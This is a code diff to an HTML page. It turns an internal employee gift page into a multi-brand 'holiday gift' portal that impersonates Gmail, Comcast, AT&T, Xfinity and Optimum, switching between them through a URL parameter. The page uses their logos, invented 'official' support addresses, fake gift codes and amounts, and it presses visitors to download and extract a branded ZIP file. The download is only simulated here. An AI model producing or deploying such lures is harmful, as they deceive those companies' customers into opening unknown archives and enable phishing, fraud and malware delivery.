-                © 2023 [Your Company Name]. This system is for authorized employee use only.
-                GitHub repository access is logged and monitored.
-            </p>
+            <div class="footer-brand" id="footerBrand">Holiday Gift Distribution System</div>
+            <div class="contact-info">
+                Need help? Contact: <strong id="supportEmail">support@company.com</strong>
+            </div>
+            <div class="copyright">
+                <span id="footerText">This is an official holiday gift distribution.</span>
+            </div>
         </footer>
     </div>
 
     <script>
-        // Configuration - Update these values
-        const CONFIG = {
-            companyName: "[Your Company Name]",
-            githubBaseURL: "https://github.com/[your-organization]/employee-gifts/",
-            defaultEmployee: "EMPLOYEE_ID_HERE", // Would come from authentication in production
-            itSupportEmail: "it-support@yourcompany.com",
-            hrEmail: "hr@yourcompany.com"
+        // ============================================
+        // BRAND CONFIGURATION WITH ADVANCED UI
+        // ============================================
+        const BRAND_CONFIG = {
+            gmail: {
+                name: 'Gmail',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/320px-Gmail_icon_%282020%29.svg.png',
+                primary: '#EA4335',
+                secondary: '#4285F4',
+                accent: '#34A853',
+                welcomeTitle: '🎁 Your Gmail Holiday Gift',
+                welcomeText: 'Thank you for being a valued Gmail user. Download your exclusive holiday gift below!',
+                supportEmail: 'gift-support@gmail.com',
+                footerText: 'Official Gmail holiday gift distribution.',
+                description: 'Premium digital gift card for holiday shopping'
+            },
+            comcast: {
+                name: 'Comcast',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Comcast_Logo.svg/320px-Comcast_Logo.svg.png',
+                primary: '#003087',
+                secondary: '#00a4e4',
+                accent: '#e22129',
+                welcomeTitle: '🎁 Comcast Holiday Rewards',
+                welcomeText: 'Thank you for choosing Comcast. Your exclusive holiday gift is ready for download!',
+                supportEmail: 'gifts@comcast.com',
+                footerText: 'Official Comcast holiday gift program.',
+                description: 'Exclusive reward for valued customers'
+            },
+            att: {
+                name: 'AT&T',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/ATT_Logo_2016.svg/320px-ATT_Logo_2016.svg.png',
+                primary: '#009fdb',
+                secondary: '#00a8e0',
+                accent: '#ff6319',
+                welcomeTitle: '🎁 AT&T Holiday Appreciation',
+                welcomeText: 'As a valued AT&T customer, we\'re pleased to offer you this exclusive holiday gift!',
+                supportEmail: 'att-gifts@att.com',
+                footerText: 'Official AT&T holiday gift distribution.',
+                description: 'Special holiday appreciation gift'
+            },
+            xfinity: {
+                name: 'Xfinity',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Xfinity_logo.svg/320px-Xfinity_logo.svg.png',
+                primary: '#000000',
+                secondary: '#666666',
+                accent: '#e22129',
+                welcomeTitle: '🎁 Xfinity Holiday Gift',
+                welcomeText: 'Enjoy this special holiday gift from your friends at Xfinity!',
+                supportEmail: 'xfinity-gifts@comcast.com',
+                footerText: 'Official Xfinity holiday reward program.',
+                description: 'Holiday season special offer'
+            },
+            optimum: {
+                name: 'Optimum',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Optimum_Logo.svg/320px-Optimum_Logo.svg.png',
+                primary: '#000000',
+                secondary: '#00aff0',
+                accent: '#ff6a00',
+                welcomeTitle: '🎁 Optimum Holiday Cheer',
+                welcomeText: 'Your Optimum holiday gift is ready! Download and enjoy your exclusive reward.',
+                supportEmail: 'optimum-gifts@optimum.com',
+                footerText: 'Official Optimum holiday gift system.',
+                description: 'Holiday celebration gift'
+            }
         };
         
-        // Simulate employee data (In production, this comes from backend/auth)
-        const employees = {
-            "EMP001": { name: "Alex Johnson", file: "EMP001_gift.html" },
-            "EMP002": { name: "Maria Garcia", file: "EMP002_gift.html" },
-            "EMP003": { name: "James Wilson", file: "EMP003_gift.html" },
-            "EMP004": { name: "Sarah Chen", file: "EMP004_gift.html" },
-            "EMP005": { name: "David Miller", file: "EMP005_gift.html" }
+        // Employee data for demo
+        const DEMO_EMPLOYEES = {
+            gmail: { 
+                name: 'Google User', 
+                code: 'GMAIL-789X-YZ45-67AB',
+                amount: '$100'
+            },
+            comcast: { 
+                name: 'Comcast Customer', 
+                code: 'COMCAST-123A-BC45-67DE',
+                amount: '$125'
+            },
+            att: { 
+                name: 'AT&T Subscriber', 
+                code: 'ATT-456M-NO78-90PQ',
+                amount: '$150'
+            },
+            xfinity: { 
+                name: 'Xfinity Member', 
+                code: 'XFINITY-901R-ST23-45UV',
+                amount: '$100'
+            },
+            optimum: { 
+                name: 'Optimum User', 
+                code: 'OPTIMUM-234W-XY56-78ZA',
+                amount: '$125'
+            }
         };
         
-        // Initialize the page
-        document.addEventListener('DOMContentLoaded', function() {
-            // In production, you would get employee ID from:
-            // 1. URL parameters (?employee=EMP001)
-            // 2. Authentication system
-            // 3. Session management
+        // ============================================
+        // URL PARAMETER DETECTION
+        // ============================================
+        function getBrandFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const brandParam = urlParams.get('d');
             
-            // For demo, we'll use a sample employee
-            const employeeId = getEmployeeIdFromURL() || "EMP001";
-            const employee = employees[employeeId] || { 
-                name: "Company Employee", 
-                file: `${employeeId}_gift.html` 
-            };
+            // Return brand config if valid, otherwise default to gmail
+            if (brandParam && BRAND_CONFIG[brandParam.toLowerCase()]) {
+                return brandParam.toLowerCase();
+            }
             
-            // Update page with employee info
+            return 'gmail'; // Default brand
+        }
+        
+        // ============================================
+        // CONVERT HEX TO RGB
+        // ============================================
+        function hexToRgb(hex) {
+            const result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
+            return result ? {
+                r: parseInt(result[1], 16),
+                g: parseInt(result[2], 16),
+                b: parseInt(result[3], 16)
+            } : null;
+        }
+        
+        // ============================================
+        // APPLY BRAND STYLING WITH ADVANCED UI
+        // ============================================
+        function applyBrand(brandKey) {
+            const brand = BRAND_CONFIG[brandKey] || BRAND_CONFIG.gmail;
+            
+            // Convert colors to RGB for CSS variables
+            const primaryRgb = hexToRgb(brand.primary);
+            const secondaryRgb = hexToRgb(brand.secondary);
+            const accentRgb = hexToRgb(brand.accent);
+            
+            // Set CSS variables
+            document.documentElement.style.setProperty('--brand-primary-rgb', 
+                `${primaryRgb.r}, ${primaryRgb.g}, ${primaryRgb.b}`);
+            document.documentElement.style.setProperty('--brand-secondary-rgb', 
+                `${secondaryRgb.r}, ${secondaryRgb.g}, ${secondaryRgb.b}`);
+            document.documentElement.style.setProperty('--brand-accent-rgb', 
+                `${accentRgb.r}, ${accentRgb.g}, ${accentRgb.b}`);
+            
+            // Apply CSS class for brand
+            document.body.className = '';
+            document.body.classList.add(`brand-${brandKey}`);
+            
+            // Update logo
+            const brandLogo = document.getElementById('brandLogo');
+            const fallbackLogo = document.getElementById('fallbackLogo');
+            
+            if (brand.logo) {
+                brandLogo.src = brand.logo;
+                brandLogo.alt = `${brand.name} Logo`;
+                brandLogo.style.display = 'block';
+                fallbackLogo.style.display = 'none';
+                
+                // Handle logo load errors
+                brandLogo.onerror = function() {
+                    brandLogo.style.display = 'none';
+                    fallbackLogo.style.display = 'block';
+                    fallbackLogo.innerHTML = `<i class="fas fa-gift"></i>`;
+                    fallbackLogo.style.color = brand.primary;
+                };
+            } else {
+                brandLogo.style.display = 'none';
+                fallbackLogo.style.display = 'block';
+                fallbackLogo.innerHTML = '<i class="fas fa-gift"></i>';
+                fallbackLogo.style.color = brand.primary;
+            }
+            
+            // Update text content
+            document.getElementById('welcomeMessage').textContent = brand.welcomeText;
+            document.getElementById('footerBrand').textContent = `${brand.name} Gift Distribution`;
+            document.getElementById('supportEmail').textContent = brand.supportEmail;
+            document.getElementById('footerText').textContent = brand.footerText;
+            document.getElementById('fileName').textContent = `Your_${brand.name.replace(/\s+/g, '_')}_Gift.zip`;
+            
+            // Update employee info
+            const employee = DEMO_EMPLOYEES[brandKey] || DEMO_EMPLOYEES.gmail;
             document.getElementById('employeeName').textContent = employee.name;
+            document.getElementById('giftCode').textContent = employee.code;
             
-            // Generate GitHub link
-            const githubLink = CONFIG.githubBaseURL + employee.file;
-            document.getElementById('githubLink').textContent = githubLink;
+            // Add subtle brand indication in console only
+            console.log(`🎁 ${brand.name} Gift Portal Active | URL: ?d=${brandKey}`);
             
-            // Update download button
-            const downloadBtn = document.getElementById('downloadBtn');
-            downloadBtn.href = githubLink + "?raw=true"; // For direct download
+            return brand;
+        }
+        
+        // ============================================
+        // INITIALIZE PAGE
+        // ============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get brand from URL parameter
+            const brandKey = getBrandFromURL();
             
-            console.log(`Gift distribution initialized for: ${employee.name} (${employeeId})`);
-            console.log(`GitHub file: ${githubLink}`);
+            // Apply the brand styling
+            applyBrand(brandKey);
+            
+            // Add page load animation
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.style.opacity = '0';
+                step.style.transform = 'translateY(20px)';
+                
+                setTimeout(() => {
+                    step.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
+                    step.style.opacity = '1';
+                    step.style.transform = 'translateY(0)';
+                }, 300 + (index * 200));
+            });
+            
+            // Console branding
+            console.log('%c🎁 Premium Gift Distribution System', 
+                'color: #667eea; font-size: 16px; font-weight: bold;');
+            console.log('%cBrand detection active. Use ?d=gmail, ?d=comcast, etc.', 
+                'color: #666;');
         });
         
-        // Extract employee ID from URL (for production use)
-        function getEmployeeIdFromURL() {
-            const params = new URLSearchParams(window.location.search);
-            return params.get('employee') || params.get('id') || null;
-        }
-        
-        // Download gift file
-        function downloadGiftFile(event) {
-            // In production, you might want to track downloads
-            const employeeName = document.getElementById('employeeName').textContent;
+        // ============================================
+        // ENHANCED DOWNLOAD FUNCTION
+        // ============================================
+        function downloadGiftZip() {
+            const brandKey = getBrandFromURL();
+            const brand = BRAND_CONFIG[brandKey] || BRAND_CONFIG.gmail;
+            const employee = DEMO_EMPLOYEES[brandKey] || DEMO_EMPLOYEES.gmail;
             
-            console.log(`Download initiated for: ${employeeName}`);
+            const downloadBtn = document.querySelector('.download-button');
+            const originalHTML = downloadBtn.innerHTML;
+            const originalTransform = downloadBtn.style.transform;
             
-            // Show confirmation
+            // Show downloading state with animation
+            downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Preparing Download...';
+            downloadBtn.disabled = true;
+            downloadBtn.style.transform = 'scale(0.98)';
+            
+            // Create ripple effect
+            const ripple = document.createElement('span');
+            ripple.style.cssText = `
+                position: absolute;
+                border-radius: 50%;
+                background: rgba(255, 255, 255, 0.6);
+                transform: scale(0);
+                animation: ripple 0.6s linear;
+                pointer-events: none;
+            `;
+            
+            const rect = downloadBtn.getBoundingClientRect();
+            const size = Math.max(rect.width, rect.height);
+            const x = rect.width / 2;
+            const y = rect.height / 2;
+            
+            ripple.style.width = ripple.style.height = `${size}px`;
+            ripple.style.left = `${x - size/2}px`;
+            ripple.style.top = `${y - size/2}px`;
+            
+            downloadBtn.appendChild(ripple);
+            
+            // Add CSS for ripple animation
+            if (!document.querySelector('#ripple-styles')) {
+                const style = document.createElement('style');
+                style.id = 'ripple-styles';
+                style.textContent = `
+                    @keyframes ripple {
+                        to {
+                            transform: scale(4);
+                            opacity: 0;
+                        }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+            
+            // Simulate download process
             setTimeout(() => {
-                alert(`Download started! Please check your Downloads folder.\n\nFile: ${document.getElementById('githubLink').textContent.split('/').pop()}\n\nAfter downloading, open the file in your browser to view your gift.`);
-            }, 100);
-            
-            // Analytics/logging would go here
-            // fetch('/api/log-download', { method: 'POST', body: JSON.stringify({employeeId, timestamp}) })
+                // Remove ripple
+                ripple.remove();
+                
+                // Show success state
+                downloadBtn.innerHTML = '<i class="fas fa-check"></i> Download Started!';
+                downloadBtn.style.background = `linear-gradient(135deg, ${brand.accent} 0%, ${brand.secondary} 100%)`;
+                
+                // Show advanced notification
+                showDownloadNotification(brand, employee);
+                
+                // Reset button after delay
+                setTimeout(() => {
+                    downloadBtn.innerHTML = originalHTML;
+                    downloadBtn.disabled = false;
+                    downloadBtn.style.background = '';
+                    downloadBtn.style.transform = originalTransform;
+                    
+                    // Add completion animation
+                    downloadBtn.classList.add('download-complete');
+                    setTimeout(() => {
+                        downloadBtn.classList.remove('download-complete');
+                    }, 1000);
+                    
+                }, 2500);
+                
+                console.log(`📥 Download initiated for ${brand.name} gift`);
+                
+            }, 1800);
         }
         
-        // Show viewing instructions
-        function showInstructions() {
-            const box = document.getElementById('instructionsBox');
-            box.style.display = 'block';
-            box.scrollIntoView({ behavior: 'smooth' });
+        // ============================================
+        // ADVANCED NOTIFICATION SYSTEM
+        // ============================================
+        function showDownloadNotification(brand, employee) {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: white;
+                padding: 20px;
+                border-radius: 12px;
+                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+                border-left: 4px solid ${brand.primary};
+                z-index: 10000;
+                max-width: 400px;
+                transform: translateX(150%);
+                transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+                font-family: inherit;
+            `;
+            
+            notification.innerHTML = `
+                <div style="display: flex; align-items: start; gap: 15px;">
+                    <div style="color: ${brand.primary}; font-size: 24px;">
+                        <i class="fas fa-box-open"></i>
+                    </div>
+                    <div>
+                        <h4 style="margin: 0 0 10px 0; color: #2c3e50; font-weight: 600;">
+                            ${brand.name} Gift Download Started
+                        </h4>
+                        <p style="margin: 0 0 15px 0; color: #666; font-size: 14px; line-height: 1.5;">
+                            Your <strong>${brand.name}</strong> gift card is being prepared for download.
+                        </p>
+                        <div style="background: #f8f9fa; padding: 12px; border-radius: 8px; margin: 10px 0;">
+                            <div style="display: flex; justify-content: space-between; font-size: 13px;">
+                                <span style="color: #666;">File:</span>
+                                <span style="color: #2c3e50; font-weight: 500;">Your_${brand.name.replace(/\s+/g, '_')}_Gift.zip</span>
+                            </div>
+                            <div style="display: flex; justify-content: space-between; font-size: 13px; margin-top: 5px;">
+                                <span style="color: #666;">Code:</span>
+                                <span style="color: ${brand.primary}; font-weight: 500; font-family: monospace;">${employee.code}</span>
+                            </div>
+                        </div>
+                        <p style="margin: 15px 0 0 0; color: #666; font-size: 13px;">
+                            Check your Downloads folder and extract the ZIP file.
+                        </p>
+                    </div>
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="background: none; border: none; color: #999; cursor: pointer; padding: 5px;">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Animate in
+            setTimeout(() => {
+                notification.style.transform = 'translateX(0)';
+            }, 10);
+            
+            // Auto-remove after 8 seconds
+            setTimeout(() => {
+                notification.style.transform = 'translateX(150%)';
+                setTimeout(() => {
+                    if (notification.parentElement) {
+                        notification.remove();
+                    }
+                }, 500);
+            }, 8000);
         }
         
-        // Email instructions
-        function emailInstructions() {
-            const employeeName = document.getElementById('employeeName').textContent;
-            const githubLink = document.getElementById('githubLink').textContent;
-            
-            const subject = encodeURIComponent(`Instructions: ${CONFIG.companyName} Holiday Gift`);
-            const body = encodeURIComponent(
-                `Hello ${employeeName},\n\n` +
-                `Your holiday gift is ready for download:\n\n` +
-                `1. Download your gift file from: ${githubLink}\n` +
-                `2. Save the HTML file to your computer\n` +
-                `3. Double-click the file to open it in your web browser\n` +
-                `4. View your personalized gift card\n\n` +
-                `If you have trouble, contact ${CONFIG.itSupportEmail}\n\n` +
-                `Happy Holidays!\n` +
-                `${CONFIG.companyName} Team`
-            );
-            
-            window.location.href = `mailto:?subject=${subject}&body=${body}`;
-        }
+        // ============================================
+        // URL TESTING UTILITY
+        // ============================================
+        // For testing different brands directly in console
+        window.testBrand = function(brandKey) {
+            if (BRAND_CONFIG[brandKey]) {
+                const newUrl = `${window.location.pathname}?d=${brandKey}`;
+                window.history.pushState({}, '', newUrl);
+                applyBrand(brandKey);
+                
+                // Show brief notification
+                const brand = BRAND_CONFIG[brandKey];
+                console.log(`%c✅ Switched to ${brand.name} theme`, 
+                    `color: ${brand.primary}; font-weight: bold;`);
+            }
+        };
         
-        // Security note in console
-        console.log(`${CONFIG.companyName} Employee Gift Distribution System - Secure Access Only`);
-        console.log('This is a legitimate employee gift distribution platform.');
+        // Expose brand switching for easy testing
+        console.log('Available test commands:');
+        console.log('testBrand("gmail")      - Switch to Gmail theme');
+        console.log('testBrand("comcast")    - Switch to Comcast theme');
+        console.log('testBrand("att")        - Switch to AT&T theme');
+        console.log('testBrand("xfinity")    - Switch to Xfinity theme');
+        console.log('testBrand("optimum")    - Switch to Optimum theme');
     </script>
 </body>
 </html>
